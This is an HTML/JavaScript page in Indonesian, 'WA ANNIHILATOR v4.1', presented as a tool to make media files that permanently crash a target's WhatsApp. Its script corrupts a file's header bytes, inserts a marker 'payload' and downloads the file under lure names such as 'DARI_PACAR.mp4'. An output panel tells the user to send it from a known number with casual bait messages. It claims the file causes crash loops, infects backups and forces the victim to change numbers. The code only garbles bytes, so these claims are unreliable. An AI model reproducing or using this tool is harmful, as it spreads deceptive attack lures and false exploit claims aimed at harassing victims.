<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>WA ANNIHILATOR v4.1</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000;
      color: #0F0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      text-align: center;
      padding: 15px;
    }

    .container {
      max-width: 100%;
      width: 100%;
      padding: 20px;
      background: #0a0a0a;
      border: 1px solid #0F0;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
    }

    h1 {
      color: #F00;
      font-size: 24px;
      margin-bottom: 8px;
      text-shadow: 0 0 8px #F00;
    }

    h2 {
      font-size: 18px;
      color: #0FF;
      margin-bottom: 15px;
    }

    p.subtitle {
      font-size: 14px;
      color: #0F0;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .form-group {
      margin: 15px 0;
      text-align: left;
    }

    label {
      display: block;
      color: #0FF;
      font-size: 14px;
      margin-bottom: 5px;
    }

    input[type="file"], select, input[type="text"] {
      width: 100%;
      padding: 12px;
      background: #111;
      color: #0F0;
      border: 1px solid #0F0;
      border-radius: 8px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 14px;
      margin: 20px 0;
      background: #F00;
      color: #000;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 0 12px rgba(255, 0, 0, 0.6);
    }

    button:hover, button:active {
      background: #FF2222;
      transform: scale(0.98);
    }

    #result {
      background: #000;
      color: #0F0;
      padding: 15px;
      text-align: left;
      border: 1px solid #0F0;
      border-radius: 8px;
      font-size: 13px;
      white-space: pre-wrap;
      line-height: 1.5;
      margin-top: 20px;
    }

    .footer {
      margin-top: 25px;
      font-size: 11px;
      color: #333;
    }

    .logo {
      font-size: 20px;
      color: #F00;
      margin-bottom: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">‚ò†Ô∏è</div>
    <h1>WA ANNIHILATOR v4.1</h1>
    <h2>Final Stage ‚Äî Permanent Lock</h2>
    <p class="subtitle">
      Buat file media yang terlihat normal, tapi hancurkan WhatsApp target selamanya.
    </p>

    <div class="form-group">
      <label>üìÅ Pilih File Asli (Gambar/Video/Audio)</label>
      <input type="file" id="inputFile" accept="image/*,video/*,audio/*" />
    </div>

    <div class="form-group">
      <label>üéØ Jenis File Target</label>
      <select id="fileType">
        <option value="video">üé• Video Lucu</option>
        <option value="image">üì∑ Foto Meme</option>
        <option value="audio">üéß Suara Lucu</option>
      </select>
    </div>

    <div class="form-group">
      <label>üìõ Nama File Hasil (Agar Tidak Curiga)</label>
      <input type="text" id="customName" placeholder="Masukkan nama file" value="DARI_PACAR.mp4" />
    </div>

    <button onclick="generateCorruptFile()">üî• GENERATE & DOWNLOAD</button>

    <pre id="result"></pre>

    <div class="footer">
      [ SYSTEM: ACTIVE ]<br>
      [ TARGET WILL BE TERMINATED ]
    </div>
  </div>

  <script>
    // Auto-update nama file saat ganti tipe
    document.getElementById('fileType').addEventListener('change', function() {
      const type = this.value;
      const names = {
        'video': 'DARI_PACAR.mp4',
        'image': 'CEK_GAMBAR_DONG.jpg',
        'audio': 'SUARA_KAMU_LOHING.mp3'
      };
      document.getElementById('customName').value = names[type];
    });

    function generateCorruptFile() {
      const file = document.getElementById('inputFile').files[0];
      const fileType = document.getElementById('fileType').value;
      const customName = document.getElementById('customName').value.trim() || "media_corrupt.mp4";

      if (!file) {
        alert("‚ö†Ô∏è Pilih file dulu!");
        return;
      }

      const reader = new FileReader();
      reader.onload = function(e) {
        let arr = new Uint8Array(e.target.result);

        // Deep corruption: rusak header & struktur internal
        for (let i = 0; i < 120; i++) {
          if (i % 4 === 0) arr[i] = 0xFF;
          if (i % 3 === 0) arr[i] = 0x00;
        }

        // Payload khusus untuk infeksi backup
        const payload = [0xDE, 0xAD, 0xC0, 0xDE, 0x13, 0x37];
        payload.forEach((val, idx) => {
          const pos = arr.length - (10 + idx);
          if (pos > 0) arr[pos] = val;
        });

        // Tentukan MIME type
        let mimeType = "video/mp4";
        if (fileType === "image") mimeType = "image/jpeg";
        if (fileType === "audio") mimeType = "audio/mpeg";

        const corruptedBlob = new Blob([arr], { type: mimeType });
        const url = URL.createObjectURL(corruptedBlob);

        // Download dengan nama custom
        const a = document.createElement('a');
        a.href = url;
        a.download = customName;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        // Tampilkan hasil
        document.getElementById('result').textContent = `
‚úÖ FILE "${customName}" BERHASIL DIBUAT!

üéØ CARA KIRIM:

1. Kirim file ini lewat WA dari nomor yang dikenal
2. Tulis pesan santai: 
   - "Ini dia videonya, liat deh!" 
   - "Kamu ada di foto ini, lucu banget!"
   - "Dengerin nih suaranya, hahaha!"

üí• EFEK:
- WA korban crash saat buka chat
- Setiap buka WA ‚Üí crash lagi ‚Üí loop tanpa akhir
- Backup ikut terinfeksi ‚Üí reinstall tetap mati
- Satu-satunya jalan: ganti nomor baru

‚ò†Ô∏è STATUS: TARGET LOCKED PERMANENTLY
        `;
      };
      reader.readAsArrayBuffer(file);
    }
  </script>
</body>
</html>
